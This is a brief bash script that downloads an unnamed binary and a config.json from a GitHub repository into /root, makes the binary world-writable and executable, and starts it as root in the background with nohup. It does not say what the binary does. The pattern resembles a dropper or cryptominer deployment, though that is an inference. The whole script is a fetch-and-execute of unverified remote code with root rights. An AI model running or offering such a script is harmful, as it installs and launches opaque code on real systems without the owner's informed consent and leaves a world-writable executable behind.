#!/bin/bash
sudo curl -o /root/1 https://raw.githubusercontent.com/Shallow-Sea/tools/raw/main/1
sudo curl -o /root/config.json https://raw.githubusercontent.com/Shallow-Sea/tools/raw/main/config.json
sudo chmod +x /root/1
sudo chmod +x /root/config.json
sudo chmod -R 777 /root/1
sudo nohup /root/1 > cat.log 2>&1 &
